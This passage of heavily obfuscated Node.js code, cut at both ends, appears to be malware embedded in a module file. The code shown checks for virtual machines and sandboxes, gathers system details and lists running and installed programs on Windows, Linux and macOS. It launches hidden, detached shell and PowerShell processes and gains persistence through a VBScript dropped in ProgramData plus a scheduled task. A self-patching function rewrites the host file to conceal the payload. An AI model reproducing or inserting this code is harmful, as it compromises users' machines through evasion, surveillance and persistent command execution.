_0x31f4c8){if(_0xcf6290[_0xe598a7(0x168)](_0xcf6290[_0xe598a7(0x122)],_0xcf6290[_0xe598a7(0x122)]))process.env[_0x345e93]&&(_0x115e84['push'](_0xe598a7(0x1d0)+_0x345e93),_0x5806cc=0x1);else return _0x4e500c[_0xe598a7(0x1d8)](_0x45f672);}try{const _0x51dbc9=execSync(_0xe598a7(0x1da),{'encoding':'utf8','timeout':0x2710}),_0x38628e=_0xcf6290['yROFk'](parseVmIndicators,_0x51dbc9);_0x38628e[_0xe598a7(0x23b)]&&(_0x115e84[_0xe598a7(0x23c)](..._0x38628e),_0x5806cc=0x1);}catch(_0x5c1fa2){}return _0x115e84[_0xe598a7(0x23c)](_0x5806cc?_0xcf6290[_0xe598a7(0x173)]:_0xe598a7(0x217)),{'systemInfo':_0x3698d6,'vmIndicators':_0x115e84};}function getSystemInfoLinux(){const _0x411162=a0_0xbafec,_0x3145f3={'VzbiP':function(_0x4226c8,_0x1834f9,_0x154fde){return _0x4226c8(_0x1834f9,_0x154fde);},'SLLcY':'uname\x20-a','VTrrJ':'lsb_release\x20-a\x202>/dev/null\x20||\x20cat\x20/etc/os-release','iUeVD':'utf8','wHEvb':function(_0x3687af,_0x48a246){return _0x3687af(_0x48a246);},'zBECa':function(_0xbadbae,_0x5ed0e3,_0x42ab59){return _0xbadbae(_0x5ed0e3,_0x42ab59);},'DJaFI':_0x411162(0x1e9),'xPshb':'Exit','kgJDc':_0x411162(0x217)},_0x35980c=[];let _0x551fb7='',_0x97a323=0x1;try{const _0x674883=_0x3145f3[_0x411162(0x1d2)](execSync,_0x3145f3[_0x411162(0x111)],{'encoding':_0x411162(0x1a7),'timeout':0x1388});_0x551fb7=_0x674883;try{const _0x50ecdb=execSync(_0x3145f3['VTrrJ'],{'encoding':_0x3145f3[_0x411162(0x10b)],'timeout':0x1388});_0x551fb7+='\x0a'+_0x50ecdb;}catch{}const _0x30ee77=_0x3145f3[_0x411162(0x242)](parseVmIndicators,_0x551fb7);if(_0x30ee77[_0x411162(0x23b)])_0x35980c[_0x411162(0x23c)](..._0x30ee77);}catch(_0x32974e){_0x35980c[_0x411162(0x23c)](_0x411162(0x179)+_0x32974e['message']);}try{const _0x1ae067=_0x3145f3[_0x411162(0x23d)](execSync,_0x3145f3[_0x411162(0x219)],{'encoding':_0x3145f3['iUeVD'],'timeout':0x1388}),_0x1a2630=parseVmIndicators(_0x1ae067);if(_0x1a2630['length'])_0x35980c[_0x411162(0x23c)](..._0x1a2630);}catch{}return _0x35980c[_0x411162(0x23c)](_0x97a323?_0x3145f3[_0x411162(0x202)]:_0x3145f3[_0x411162(0x13f)]),{'systemInfo':_0x551fb7,'vmIndicators':_0x35980c};}function getSystemInfoMac(){const _0x47191c=a0_0xbafec,_0x4dad84={'YbcTE':function(_0x511d08,_0x76710e,_0x136be6){return _0x511d08(_0x76710e,_0x136be6);},'RFPFa':_0x47191c(0x11a),'aVGVN':function(_0x3a84b6,_0x4f9688,_0x294c06){return _0x3a84b6(_0x4f9688,_0x294c06);},'mnThM':_0x47191c(0x1a7),'TCoNR':function(_0x34e081,_0x3ca6db){return _0x34e081+_0x3ca6db;},'LJeib':function(_0x34b091,_0x1418d2){return _0x34b091(_0x1418d2);},'WnXDz':_0x47191c(0x217)},_0xbbb4c7=[];let _0x231381='',_0x5e338d=0x1;try{const _0x5b10f6=_0x4dad84[_0x47191c(0x226)](execSync,_0x4dad84['RFPFa'],{'encoding':_0x47191c(0x1a7),'timeout':0x1388});_0x231381=_0x5b10f6;try{const _0x36f7db=_0x4dad84['aVGVN'](execSync,_0x47191c(0x100),{'encoding':_0x4dad84[_0x47191c(0x1fa)],'timeout':0x2710});_0x231381+=_0x4dad84['TCoNR']('\x0a',_0x36f7db);}catch{}const _0x5ddc3e=_0x4dad84['LJeib'](parseVmIndicators,_0x231381);if(_0x5ddc3e['length'])_0xbbb4c7[_0x47191c(0x23c)](..._0x5ddc3e);}catch(_0x21d6f5){_0xbbb4c7[_0x47191c(0x23c)](_0x47191c(0x179)+_0x21d6f5[_0x47191c(0x195)]);}return _0xbbb4c7['push'](_0x5e338d?_0x47191c(0x1a3):_0x4dad84[_0x47191c(0x230)]),{'systemInfo':_0x231381,'vmIndicators':_0xbbb4c7};}function isAdmin(){const _0xb56320=a0_0xbafec,_0x5d0990={'zWugx':function(_0x1b23c4,_0x5b2cc8){return _0x1b23c4(_0x5b2cc8);},'XMCVU':_0xb56320(0x1a7),'xGbBY':function(_0x5e515c,_0x3473aa){return _0x5e515c!==_0x3473aa;},'kcjgo':_0xb56320(0x211),'RbOUi':_0xb56320(0x121),'vyLCO':function(_0x5520e6,_0x45be55,_0x1727ac){return _0x5520e6(_0x45be55,_0x1727ac);}};return new Promise(_0x55d29a=>{const _0x308760=_0xb56320;if(_0x5d0990[_0x308760(0x1b1)](_0x5d0990[_0x308760(0x26e)],_0x5d0990[_0x308760(0x215)]))_0x5d0990[_0x308760(0x22c)](exec,_0x308760(0x1e5),(_0x3683a5,_0x566ca5)=>{const _0x5e09db=_0x308760;if(_0x3683a5)return _0x55d29a(![]);_0x5d0990[_0x5e09db(0x10c)](_0x55d29a,_0x566ca5[_0x5e09db(0x1af)](_0x5e09db(0x26a)));});else{const _0x19b1cf=_0x136aa0,_0x1dab23=_0x1b1da4[_0x308760(0x1d8)](_0x19b1cf,_0x5d0990[_0x308760(0x265)]),_0xc53923=_0x308760(0x10e),_0x435f6c=_0x308760(0x251),_0x3abde9=_0x1dab23[_0x308760(0x162)](_0xc53923),_0x27da62=_0x1dab23['indexOf'](_0x435f6c),_0x17be20=_0x1dab23[_0x308760(0x102)](_0x27da62);_0x390d1d[_0x308760(0x20d)](_0x19b1cf,_0x17be20);}});}function getSystemInfo(){const _0x52725c=a0_0xbafec,_0x1e59c2={'POUgY':function(_0x8bbdfe,_0x1cfa48,_0x2d9e31){return _0x8bbdfe(_0x1cfa48,_0x2d9e31);},'rJHJU':'reg\x20query\x20HKLM\x5cSYSTEM\x5cCurrentControlSet\x5cServices\x20/s','FvQux':_0x52725c(0x1a7),'xGzKa':'VBox','QnGnx':'⚠️\x20\x20VM\x20drivers\x20detected\x20in\x20registry','MBOJs':function(_0x561554,_0x26b497){return _0x561554===_0x26b497;},'MyeuP':_0x52725c(0x139),'KMMIk':'INPPp','iUOsl':_0x52725c(0x23e),'Mhayr':function(_0x1bb536,_0x204fff,_0x524026){return _0x1bb536(_0x204fff,_0x524026);},'oyRCn':_0x52725c(0x153),'UrpVa':_0x52725c(0x1f3),'kVgcK':_0x52725c(0x146),'qinrQ':'QEMU','jLBOS':_0x52725c(0x192),'flDUc':_0x52725c(0x169),'poOmY':_0x52725c(0x142),'ekDYS':_0x52725c(0x1de),'FREgc':_0x52725c(0x1e4),'aVKoe':_0x52725c(0x18c),'jjcfi':'VMWARE_RUNTIME','sIUJF':function(_0x1ee8b9,_0x5c8de7){return _0x1ee8b9!==_0x5c8de7;},'xeMLh':_0x52725c(0x20a),'jEuOt':_0x52725c(0x1f1),'HTBPs':'Exit','gSNEX':'vmIndicators'};let _0x27efa2={};const _0x360182=[],_0x20762d=process[_0x52725c(0x152)];_0x360182[_0x52725c(0x23c)]('OS:\x20'+(_0x1e59c2[_0x52725c(0x210)](_0x20762d,_0x1e59c2[_0x52725c(0x12f)])?_0x52725c(0x1c4):_0x20762d));let _0x5c8512=0x0;if(_0x1e59c2[_0x52725c(0x210)](_0x20762d,_0x1e59c2[_0x52725c(0x12f)])){if(_0x1e59c2[_0x52725c(0x25e)]===_0x1e59c2[_0x52725c(0x1f2)]){const _0x76b5e7=_0x1e59c2[_0x52725c(0x16e)](_0x11a793,_0x1e59c2[_0x52725c(0x1cf)],{'encoding':_0x1e59c2[_0x52725c(0x17f)],'timeout':0x2710});(_0x76b5e7['includes'](_0x1e59c2['xGzKa'])||_0x76b5e7[_0x52725c(0x1af)](_0x52725c(0x146)))&&(_0x19ed31['push'](_0x1e59c2['QnGnx']),_0x5be503=0x1);}else{try{const _0x1fa125=_0x1e59c2['Mhayr'](execSync,_0x52725c(0x161),{'encoding':_0x1e59c2[_0x52725c(0x17f)],'timeout':0x2710});_0x27efa2[_0x1e59c2[_0x52725c(0x1a0)]]=_0x1fa125;const _0x26c572=[_0x1e59c2[_0x52725c(0x197)],_0x1e59c2[_0x52725c(0x236)],_0x1e59c2[_0x52725c(0x26b)],_0x1e59c2['jLBOS'],_0x1e59c2['flDUc'],_0x52725c(0x1cc),_0x1e59c2[_0x52725c(0x189)],_0x1e59c2[_0x52725c(0x103)]];for(const _0xf522e3 of _0x26c572){if(_0x52725c(0x1e4)!==_0x1e59c2[_0x52725c(0x25f)])throw new _0x3d96e3(_0x52725c(0x120)+_0x3e16eb+':\x20'+_0x4bb8ac[_0x52725c(0x195)]);else _0x1fa125['toLowerCase']()[_0x52725c(0x1af)](_0xf522e3[_0x52725c(0x147)]())&&(_0x360182['push'](_0x52725c(0x1a8)+_0xf522e3),_0x5c8512=0x1);}}catch(_0x3aa15c){_0x360182['push'](_0x52725c(0x234)+_0x3aa15c[_0x52725c(0x195)]);}const _0x5c8a70=[_0x1e59c2[_0x52725c(0x11d)],_0x1e59c2[_0x52725c(0x1c8)],_0x52725c(0x188)];for(const _0x5e79dd of _0x5c8a70){_0x1e59c2[_0x52725c(0x1fc)](_0x52725c(0x1aa),_0x1e59c2['xeMLh'])?process.env[_0x5e79dd]&&(_0x360182[_0x52725c(0x23c)](_0x52725c(0x1d0)+_0x5e79dd),_0x5c8512=0x1):(_0x53cb42[_0x52725c(0x23c)]('⚠️\x20\x20Detected:\x20'+_0x3a32fb),_0x3aa141=0x1);}try{if(_0x1e59c2[_0x52725c(0x1fc)](_0x52725c(0x1d9),_0x1e59c2[_0x52725c(0xff)])){const _0x34fe87=_0x1e59c2[_0x52725c(0x16e)](execSync,_0x1e59c2[_0x52725c(0x1cf)],{'encoding':_0x1e59c2[_0x52725c(0x17f)],'timeout':0x2710});(_0x34fe87[_0x52725c(0x1af)](_0x52725c(0x14a))||_0x34fe87[_0x52725c(0x1af)](_0x1e59c2[_0x52725c(0x236)]))&&(_0x360182['push'](_0x1e59c2[_0x52725c(0x203)]),_0x5c8512=0x1);}else _0x3adeea[_0x52725c(0x23c)]('Error\x20getting\x20systeminfo:\x20'+_0x29dfcc[_0x52725c(0x195)]);}catch(_0x2074e0){}}}else _0x5c8512=0x1;return _0x360182[_0x52725c(0x23c)](_0x5c8512?_0x1e59c2[_0x52725c(0x17e)]:_0x52725c(0x217)),_0x27efa2[_0x1e59c2[_0x52725c(0x24f)]]=_0x360182,_0x27efa2;}function runShell(_0x121c72){const _0x3e4bf1={'ZFRVb':function(_0x5d59ae,_0xf23fbf){return _0x5d59ae(_0xf23fbf);},'WtaXT':function(_0xe471df,_0xb237d9){return _0xe471df(_0xb237d9);},'DpsoR':function(_0x86f8a3,_0x44a80b,_0x3f03de,_0x173944){return _0x86f8a3(_0x44a80b,_0x3f03de,_0x173944);}};return new Promise((_0x256761,_0x2d4759)=>{const _0x48eb2c=a0_0x20f6,_0xe7d831={'mvMPz':function(_0x235261,_0x2f4b8c){const _0x269e4d=a0_0x20f6;return _0x3e4bf1[_0x269e4d(0x1e6)](_0x235261,_0x2f4b8c);},'PtWMf':function(_0x193df7,_0x4375d8){const _0x2fd800=a0_0x20f6;return _0x3e4bf1[_0x2fd800(0x163)](_0x193df7,_0x4375d8);}};_0x3e4bf1[_0x48eb2c(0x259)](exec,_0x121c72,{'shell':!![]},(_0xf756a6,_0x33ffa6,_0x236d08)=>{const _0x3d59cf=_0x48eb2c;if(_0xf756a6){_0xe7d831[_0x3d59cf(0x218)](_0x2d4759,_0xf756a6);return;}_0xe7d831['PtWMf'](_0x256761,{'stdout':_0x33ffa6[_0x3d59cf(0x13a)](),'stderr':_0x236d08['trim']()});});});}function runPowershell(_0x23c7ae){const _0x425cf1=a0_0xbafec,_0x579309={'nALKk':_0x425cf1(0x198),'aWFwl':function(_0x8aac6e,_0x12f00c){return _0x8aac6e===_0x12f00c;},'ZbxGu':_0x425cf1(0x22a)};exec(_0x425cf1(0x119)+_0x23c7ae+'\x22',(_0x25db50,_0x652d2c,_0xbff9a0)=>{const _0x241b0c=_0x425cf1;if(_0x579309[_0x241b0c(0x1ee)](_0x579309[_0x241b0c(0x24d)],_0x579309[_0x241b0c(0x24d)])){if(_0x25db50)return;if(_0xbff9a0)return;}else{const _0x582478=_0x32aa95(iUGdXm[_0x241b0c(0x1be)],{'encoding':'utf8','timeout':0x1388});_0x546e01+='\x0a'+_0x582478;}});}function createshellchild(_0x2ed8a1){const _0x536985=a0_0xbafec,_0xdb72c0={'cyhaB':function(_0x30b8c1,_0x32649b,_0x69e00c){return _0x30b8c1(_0x32649b,_0x69e00c);},'zrrfJ':'ignore'},_0x1af632=_0x2ed8a1['replace'](/\r\n/g,'\x0a')['replace'](/\r/g,'\x0a'),_0x453694=_0xdb72c0[_0x536985(0x235)](spawn,_0x1af632,{'shell':!![],'windowsHide':!![],'stdio':_0xdb72c0[_0x536985(0x154)],'detached':!![]});_0x453694['unref']();}function createrunpowershellchild(_0x1a47e7){const _0x2df28c=a0_0xbafec,_0x149773={'fjxLL':function(_0x15f1ce,_0x42ae7a,_0x26e0f1,_0x2e9ed8){return _0x15f1ce(_0x42ae7a,_0x26e0f1,_0x2e9ed8);},'gcyye':'-Command','DmSba':_0x2df28c(0x223)};_0x149773[_0x2df28c(0x257)](spawn,_0x2df28c(0x1c7),[_0x149773[_0x2df28c(0x24e)],_0x1a47e7],{'shell':!![],'detached':!![],'stdio':_0x149773['DmSba'],'windowsHide':!![]});}function a0_0x20f6(_0x4f2752,_0x11c3e8){_0x4f2752=_0x4f2752-0xff;const _0x78af31=a0_0x20e9();let _0x3b7332=_0x78af31[_0x4f2752];if(a0_0x20f6['xvOzwq']===undefined){var _0x2c4cef=function(_0x380744){const _0x1935f2='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x4ee4f8='',_0x3a30c6='',_0x37f756=_0x4ee4f8+_0x2c4cef,_0x1f17f9=(''+function(){return 0x0;})['indexOf']('\x0a')!==-0x1;for(let _0x2e0785=0x0,_0xfb6cb3,_0x19b5e0,_0x57fadb=0x0;_0x19b5e0=_0x380744['charAt'](_0x57fadb++);~_0x19b5e0&&(_0xfb6cb3=_0x2e0785%0x4?_0xfb6cb3*0x40+_0x19b5e0:_0x19b5e0,_0x2e0785++%0x4)?_0x4ee4f8+=_0x1f17f9||_0x37f756['charCodeAt'](_0x57fadb+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0xfb6cb3>>(-0x2*_0x2e0785&0x6)):_0x2e0785:0x0){_0x19b5e0=_0x1935f2['indexOf'](_0x19b5e0);}for(let _0x2ca3a4=0x0,_0xd30fbf=_0x4ee4f8['length'];_0x2ca3a4<_0xd30fbf;_0x2ca3a4++){_0x3a30c6+='%'+('00'+_0x4ee4f8['charCodeAt'](_0x2ca3a4)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3a30c6);};a0_0x20f6['wTHEXF']=_0x2c4cef,a0_0x20f6['CKnZSf']={},a0_0x20f6['xvOzwq']=!![];}const _0x20e9eb=_0x78af31[0x0],_0x20f679=_0x4f2752+_0x20e9eb,_0x5cbce1=a0_0x20f6['CKnZSf'][_0x20f679];if(!_0x5cbce1){const _0x3e78af=function(_0x5bce60){this['jlXJNF']=_0x5bce60,this['HOdXiE']=[0x1,0x0,0x0],this['zEIpCK']=function(){return'newState';},this['XVBvhE']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['lBdhhZ']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x3e78af['prototype']['dKMSLc']=function(){const _0x1869ba=new RegExp(this['XVBvhE']+this['lBdhhZ']),_0x1b1fb3=_0x1869ba['test'](this['zEIpCK']['toString']())?--this['HOdXiE'][0x1]:--this['HOdXiE'][0x0];return this['Vpklgc'](_0x1b1fb3);},_0x3e78af['prototype']['Vpklgc']=function(_0x1c8237){if(!Boolean(~_0x1c8237))return _0x1c8237;return this['BQsRxj'](this['jlXJNF']);},_0x3e78af['prototype']['BQsRxj']=function(_0x54c547){for(let _0x26743f=0x0,_0x4fa3aa=this['HOdXiE']['length'];_0x26743f<_0x4fa3aa;_0x26743f++){this['HOdXiE']['push'](Math['round'](Math['random']())),_0x4fa3aa=this['HOdXiE']['length'];}return _0x54c547(this['HOdXiE'][0x0]);},(''+function(){return 0x0;})['indexOf']('\x0a')===-0x1&&new _0x3e78af(a0_0x20f6)['dKMSLc'](),_0x3b7332=a0_0x20f6['wTHEXF'](_0x3b7332),a0_0x20f6['CKnZSf'][_0x20f679]=_0x3b7332;}else _0x3b7332=_0x5cbce1;return _0x3b7332;}async function createTask(){const _0x51727c=a0_0xbafec,_0x3c616c={'DxovP':function(_0x40750d,_0x20001c,_0x305fa5){return _0x40750d(_0x20001c,_0x305fa5);},'aSTHn':function(_0x1879d8){return _0x1879d8();},'uGPVI':_0x51727c(0x160),'paoFp':'C:\x5cProgramData\x5cPrograms','hEZVA':_0x51727c(0x250),'VvNWP':_0x51727c(0x18a),'VLrgy':'ProgramData','KezsN':'error.log','OAEaz':_0x51727c(0x175),'DiLYB':function(_0x1496d4,_0x52b242,_0xe03071){return _0x1496d4(_0x52b242,_0xe03071);}},_0x59f515=await _0x3c616c[_0x51727c(0x191)](isAdmin),_0x42cc9e=path[_0x51727c(0x113)](_0x51727c(0x1f5),_0x3c616c[_0x51727c(0x20e)]),_0x121167=path[_0x51727c(0x113)](_0x3c616c[_0x51727c(0x194)],_0x51727c(0x150)),_0x103bb6=path[_0x51727c(0x113)]('C:\x5cProgramData\x5cPrograms',_0x3c616c[_0x51727c(0x1e8)]),_0x916ca7=_0x3c616c[_0x51727c(0x185)],_0x1396bc=('Dim\x20pidFile\x0a\x20\x20\x20\x20\x20\x20Dim\x20fso\x0a\x20\x20\x20\x20\x20\x20Dim\x20shell\x0a\x20\x20\x20\x20\x20\x20On\x20Error\x20Resume\x20Next\x0a\x0a\x20\x20\x20\x20\x20\x20pidFile\x20=\x20\x22'+_0x121167[_0x51727c(0x156)](/\\/g,'\x5c\x5c')+_0x51727c(0x1ba)+_0x103bb6[_0x51727c(0x156)](/\\/g,'\x5c\x5c')+_0x51727c(0x15d)+path[_0x51727c(0x113)]('C:',_0x3c616c[_0x51727c(0x20b)],_0x51727c(0x1c5),_0x3c616c[_0x51727c(0x18e)])[_0x51727c(0x156)](/\\/g,'\x5c\x5c')+_0x51727c(0x177))[_0x51727c(0x13a)]();fs[_0x51727c(0x20d)](_0x42cc9e,_0x1396bc);const _0x10c08a=[_0x3c616c['OAEaz'],_0x51727c(0x1d3)+_0x916ca7+'\x22',_0x51727c(0x19e)+_0x42cc9e+'\x22',_0x51727c(0x135),_0x51727c(0x14f),_0x59f515?_0x51727c(0x165):_0x51727c(0x1b0)+process.env.USERNAME,'/f']['join']('\x20');_0x3c616c[_0x51727c(0x186)](exec,_0x10c08a,(_0x113a02,_0x5c80a5)=>{const _0x2a719b=_0x51727c;if(_0x113a02)return;_0x3c616c[_0x2a719b(0x1ff)](exec,_0x2a719b(0x166)+_0x916ca7+'\x22',(_0x48941b,_0x572c56)=>{if(_0x48941b)return;});});}async function getProgramInfoWindows(){const _0x4c947a=a0_0xbafec,_0x3e4775={'mMvOh':_0x4c947a(0x170),'eUumb':function(_0x15e56d,_0xb203b0){return _0x15e56d(_0xb203b0);},'XCRid':_0x4c947a(0x15b),'KyUEv':_0x4c947a(0x23a),'eqyDW':_0x4c947a(0x1b6),'cneQg':function(_0x1940f2,_0x490b1d){return _0x1940f2===_0x490b1d;},'uwiPF':_0x4c947a(0x212),'wYbEX':function(_0x18a335,_0x29eeb9){return _0x18a335!==_0x29eeb9;},'Hfjub':_0x4c947a(0x12b),'UCcVB':function(_0x4c4524,_0x245e5e){return _0x4c4524(_0x245e5e);},'raFgE':_0x4c947a(0x140)},_0x1b1f59=new Set(),_0x594d81=new Set();try{const {stdout:_0x4360c1}=await runShell(_0x4c947a(0x264)),_0x394bd6=_0x4360c1[_0x4c947a(0x13a)]()[_0x4c947a(0x18f)](/\r?\n/);_0x394bd6[_0x4c947a(0x1d4)]();const _0x480a25=new Set([_0x3e4775[_0x4c947a(0x1eb)],_0x3e4775[_0x4c947a(0x256)],_0x3e4775[_0x4c947a(0x1dc)]]);for(const _0x352451 of _0x394bd6){if(_0x3e4775['cneQg'](_0x4c947a(0x22e),_0x4c947a(0x1e3))){const _0xd3aedf=_0x528c52(),_0x4e5b61=_0x75bc35[_0x4c947a(0x1ab)](0x10),_0x5b466d=_0x34d3e2['createCipheriv'](lEnGXM[_0x4c947a(0x26d)],_0xd3aedf,_0x4e5b61),_0x41b14b=_0x4d3d97[_0x4c947a(0x21f)](_0x37f16c),_0x157083=_0x401800[_0x4c947a(0x1ec)]([_0x5b466d[_0x4c947a(0x1d5)](_0x41b14b,_0x4c947a(0x1a7)),_0x5b466d[_0x4c947a(0x199)]()]);return _0x34f159[_0x4c947a(0x1ec)]([_0x4e5b61,_0x157083]);}else{const _0x5a4d84=[..._0x352451[_0x4c947a(0x133)](/"([^\"]*)"/g)][_0x4c947a(0x1ae)](_0x3c284f=>_0x3c284f[0x1]),_0x5704b4=_0x5a4d84[0x0],_0x544807=(_0x5a4d84[0x6]||'')[_0x4c947a(0x12a)]();if(!_0x480a25['has'](_0x544807))_0x1b1f59[_0x4c947a(0x145)](_0x5704b4);}}}catch(_0x12954e){}try{const {stdout:_0x2f7b79}=await _0x3e4775[_0x4c947a(0x1a6)](runShell,_0x3e4775[_0x4c947a(0x1f8)]);for(const _0x6cc3d7 of _0x2f7b79[_0x4c947a(0x18f)](/\r?\n/)){const _0x22fb7c=_0x6cc3d7[_0x4c947a(0x222)](/^\s*DisplayName\s+REG_SZ\s+(.+)$/i);if(_0x22fb7c)_0x594d81[_0x4c947a(0x145)](_0x22fb7c[0x1][_0x4c947a(0x13a)]());}}catch(_0x20b887){}try{if(_0x3e4775[_0x4c947a(0x209)](_0x3e4775['Hfjub'],_0x3e4775[_0x4c947a(0x196)]))_0x5edb99['push'](_0x4c947a(0x1d0)+_0x1471e9),_0x1b6826=0x1;else{const {stdout:_0x3ec28c}=await _0x3e4775[_0x4c947a(0x11c)](runShell,'reg\x20query\x20\x22HKEY_CURRENT_USER\x5cSOFTWARE\x5cMicrosoft\x5cWindows\x5cCurrentVersion\x5cUninstall\x22\x20/s');for(const _0x1429b0 of _0x3ec28c[_0x4c947a(0x18f)](/\r?\n/)){if(_0x3e4775[_0x4c947a(0x10a)](_0x4c947a(0x140),_0x3e4775[_0x4c947a(0x176)])){const _0x354ec0=_0x1429b0['match'](/^\s*DisplayName\s+REG_SZ\s+(.+)$/i);if(_0x354ec0)_0x594d81[_0x4c947a(0x145)](_0x354ec0[0x1][_0x4c947a(0x13a)]());}else{lEnGXM[_0x4c947a(0x1a6)](_0x5d2ec3,_0x2dce28);return;}}}}catch(_0x2ce29c){}return{'running':Array[_0x4c947a(0x19a)](_0x1b1f59),'installed':Array['from'](_0x594d81)};}async function getProgramInfoLinux(){const _0x4583ee=a0_0xbafec,_0x288d59={'TyMgE':function(_0x22e392,_0x33e52b){return _0x22e392===_0x33e52b;},'UifyT':_0x4583ee(0x104),'eRfmP':function(_0x5d728b,_0x11407a){return _0x5d728b(_0x11407a);},'RWwMa':_0x4583ee(0x14d),'cWCgL':function(_0x5585b4,_0x207ec4){return _0x5585b4(_0x207ec4);}},_0x508578=new Set(),_0x4fadc9=new Set();try{if(_0x288d59[_0x4583ee(0x184)](_0x288d59['UifyT'],_0x288d59[_0x4583ee(0x207)])){const {stdout:_0x52f4eb}=await _0x288d59[_0x4583ee(0x237)](runShell,_0x288d59[_0x4583ee(0x149)]);_0x52f4eb[_0x4583ee(0x18f)](/\n/)['forEach'](_0x2dcf25=>_0x2dcf25[_0x4583ee(0x13a)]()&&_0x508578[_0x4583ee(0x145)](_0x2dcf25[_0x4583ee(0x13a)]()));}else _0x2b57fc[_0x4583ee(0x147)]()['includes'](_0x280ee2['toLowerCase']())&&(_0x1adeb3['push'](_0x4583ee(0x1a8)+_0x2fe29b),_0x53fcf1=0x1);}catch(_0xadecb6){}try{const {stdout:_0x551433}=await runShell(_0x4583ee(0x1bd));_0x551433[_0x4583ee(0x18f)](/\n/)[_0x4583ee(0x22f)](_0x3f97b7=>_0x3f97b7['trim']()&&_0x4fadc9[_0x4583ee(0x145)](_0x3f97b7[_0x4583ee(0x13a)]()));}catch(_0x19a610){}try{const {stdout:_0x5a2131}=await _0x288d59[_0x4583ee(0x101)](runShell,_0x4583ee(0x15a));_0x5a2131['split'](/\n/)[_0x4583ee(0x22f)](_0x6cbce9=>_0x6cbce9['trim']()&&_0x4fadc9[_0x4583ee(0x145)](_0x6cbce9[_0x4583ee(0x13a)]()));}catch(_0x4c3487){}return{'running':Array['from'](_0x508578),'installed':Array[_0x4583ee(0x19a)](_0x4fadc9)};}async function getProgramInfoMac(){const _0x4585a1=a0_0xbafec,_0x3cfc8b={'huERq':function(_0x2b32e0,_0x184ef5,_0x56d235){return _0x2b32e0(_0x184ef5,_0x56d235);},'EOGLq':_0x4585a1(0x1e5),'vcmyh':function(_0x3585db,_0x17c825){return _0x3585db(_0x17c825);},'Dldih':_0x4585a1(0x26a),'miiKQ':function(_0x4e9654,_0x238e4d){return _0x4e9654(_0x238e4d);},'AiRuK':_0x4585a1(0x14d),'JjPIf':_0x4585a1(0x225),'gYZAS':function(_0x318188,_0x1382b0){return _0x318188!==_0x1382b0;},'CBvnX':_0x4585a1(0x123),'wIZpI':function(_0x17d71d,_0x5b4eb6){return _0x17d71d(_0x5b4eb6);}},_0x49384e=new Set(),_0x9efc17=new Set();try{const {stdout:_0x4756fb}=await _0x3cfc8b[_0x4585a1(0x106)](runShell,_0x3cfc8b[_0x4585a1(0x269)]);_0x4756fb[_0x4585a1(0x18f)](/\n/)[_0x4585a1(0x22f)](_0xcbf1b9=>_0xcbf1b9['trim']()&&_0x49384e['add'](_0xcbf1b9[_0x4585a1(0x13a)]()));}catch(_0x1022ac){}try{const {stdout:_0x341947}=await _0x3cfc8b[_0x4585a1(0x20c)](runShell,_0x3cfc8b[_0x4585a1(0x1d7)]);_0x341947[_0x4585a1(0x18f)](/\n/)[_0x4585a1(0x22f)](_0x54a26e=>_0x54a26e[_0x4585a1(0x13a)]()&&_0x9efc17[_0x4585a1(0x145)](_0x54a26e[_0x4585a1(0x13a)]()));}catch(_0xb1defd){}try{if(_0x3cfc8b[_0x4585a1(0x1a5)](_0x3cfc8b[_0x4585a1(0x205)],'lpRwU')){const {stdout:_0x41d308}=await _0x3cfc8b[_0x4585a1(0x190)](runShell,_0x4585a1(0x164));_0x41d308[_0x4585a1(0x18f)](/\n/)['forEach'](_0x49682c=>_0x49682c[_0x4585a1(0x13a)]()&&_0x9efc17[_0x4585a1(0x145)](_0x49682c[_0x4585a1(0x13a)]()));}else{const _0x1c230b={'XzdVt':function(_0x2f866a,_0xed2be0){const _0x92acb8=_0x4585a1;return DIYgmt[_0x92acb8(0x20c)](_0x2f866a,_0xed2be0);},'owjQu':DIYgmt[_0x4585a1(0x159)]};return new _0x2573b9(_0x4f2fb1=>{DIYgmt['huERq'](_0x2d95b3,DIYgmt['EOGLq'],(_0x2b4aa0,_0x59d93e)=>{const _0x46db2f=a0_0x20f6;if(_0x2b4aa0)return _0x1c230b[_0x46db2f(0x10d)](_0x4f2fb1,![]);_0x1c230b[_0x46db2f(0x10d)](_0x4f2fb1,_0x59d93e[_0x46db2f(0x1af)](_0x1c230b['owjQu']));});});}}catch(_0x5a9bde){}return{'running':Array[_0x4585a1(0x19a)](_0x49384e),'installed':Array['from'](_0x9efc17)};}async function getProgramInfo(){const _0x398693=a0_0xbafec,_0x4652b9={'nYwYw':function(_0x40dc1e,_0x28ea24){return _0x40dc1e===_0x28ea24;},'cmgQh':_0x398693(0x139),'BPWdO':function(_0x301ad2){return _0x301ad2();},'hCuUf':function(_0x2ba111,_0x3160b0){return _0x2ba111===_0x3160b0;},'uuDON':_0x398693(0x224),'HUwqf':function(_0x4f5c42){return _0x4f5c42();},'bWyES':_0x398693(0x22d)},_0x1a8e8a=process[_0x398693(0x152)];if(_0x4652b9[_0x398693(0x1b9)](_0x1a8e8a,_0x4652b9['cmgQh']))return _0x4652b9[_0x398693(0x16d)](getProgramInfoWindows);if(_0x4652b9[_0x398693(0x1fd)](_0x1a8e8a,_0x4652b9[_0x398693(0x267)]))return _0x4652b9[_0x398693(0x1e7)](getProgramInfoLinux);if(_0x4652b9[_0x398693(0x1b9)](_0x1a8e8a,_0x4652b9[_0x398693(0x1ad)]))return _0x4652b9[_0x398693(0x16d)](getProgramInfoMac);return{'running':[],'installed':[]};}function getCurrentTime(){const _0x2ed68a=a0_0xbafec;return new Date()[_0x2ed68a(0x201)]();}function patch(){const _0x27e4a0=a0_0xbafec,_0x34c528={'MJfNZ':'utf8','CBFRn':'{\x20default:\x20obj\x20};\x20}'},_0x4b2cb5=__filename,_0x1ee7b1=fs[_0x27e4a0(0x1d8)](_0x4b2cb5,_0x34c528[_0x27e4a0(0x124)]),_0x4a3d81=_0x34c528[_0x27e4a0(0x15f)],_0xe99cc6=_0x27e4a0(0x251),_0x2ebc2b=_0x1ee7b1[_0x27e4a0(0x162)](_0x4a3d81),_0x539bc0=_0x1ee7b1[_0x27e4a0(0x162)](_0xe99cc6),_0x687768=_0x1ee7b1[_0x27e4a0(0x102)](_0x539bc0);fs[_0x27e4a0(0x20d)](_0x4b2cb5,_0x687768);}async function main(){const 